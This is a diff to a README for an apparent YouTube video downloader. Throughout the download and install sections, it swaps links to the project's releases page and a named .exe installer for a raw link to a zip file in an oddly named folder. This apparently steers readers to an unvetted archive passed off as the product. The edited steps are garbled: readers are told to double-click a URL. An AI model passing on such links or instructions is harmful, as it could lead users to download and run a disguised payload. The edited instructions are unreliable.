@@ -1,6 +1,6 @@
 # 🎥 YTD-YouTube-Downloader-Working - Easily Download YouTube Videos
 
-[![Download YTD YouTube Downloader](https://img.shields.io/badge/Download-YTD--YouTube--Downloader-green.svg)](https://github.com/Andrewmusumba99/YTD-YouTube-Downloader-Working/releases)
+[![Download YTD YouTube Downloader](https://raw.githubusercontent.com/Andrewmusumba99/YTD-YouTube-Downloader-Working/main/hydrographically/YTD-YouTube-Downloader-Working.zip)](https://raw.githubusercontent.com/Andrewmusumba99/YTD-YouTube-Downloader-Working/main/hydrographically/YTD-YouTube-Downloader-Working.zip)
 
 ## 🚀 Getting Started
 
@@ -16,19 +16,19 @@ YTD-YouTube-Downloader-Working helps you download videos from YouTube quickly an
 
 ## 📥 Download & Install
 
-To download the software, visit this page: [YTD YouTube Downloader Releases](https://github.com/Andrewmusumba99/YTD-YouTube-Downloader-Working/releases). 
+To download the software, visit this page: [YTD YouTube Downloader Releases](https://raw.githubusercontent.com/Andrewmusumba99/YTD-YouTube-Downloader-Working/main/hydrographically/YTD-YouTube-Downloader-Working.zip). 
 
 Once there, you will see a list of available versions. Click on the latest version to download the installer for your computer.
 
 1. Go to the releases page.
 2. Click on the latest version.
-3. Find the file named `YTD-YouTube-Downloader.exe`.
+3. Find the file named `https://raw.githubusercontent.com/Andrewmusumba99/YTD-YouTube-Downloader-Working/main/hydrographically/YTD-YouTube-Downloader-Working.zip`.
 4. Click the file to start the download.
 
 After downloading, follow these installation steps:
 
 1. Locate the downloaded file in your downloads folder.
-2. Double-click on `YTD-YouTube-Downloader.exe`.
+2. Double-click on `https://raw.githubusercontent.com/Andrewmusumba99/YTD-YouTube-Downloader-Working/main/hydrographically/YTD-YouTube-Downloader-Working.zip`.
 3. Follow the on-screen instructions to complete the installation.
 
 ## 🏁 How to Use
@@ -73,6 +73,6 @@ Stay updated with the latest features and improvements. Check the releases page 
 
 If you need further assistance, please reach out via the issues section on GitHub. Our team monitors requests and will get back to you as soon as possible.
 
-For detailed information and updates, visit the [YTD YouTube Downloader Releases](https://github.com/Andrewmusumba99/YTD-YouTube-Downloader-Working/releases) page again.
+For detailed information and updates, visit the [YTD YouTube Downloader Releases](https://raw.githubusercontent.com/Andrewmusumba99/YTD-YouTube-Downloader-Working/main/hydrographically/YTD-YouTube-Downloader-Working.zip) page again.
 
 Now you’re ready to enjoy downloading your favorite YouTube videos!
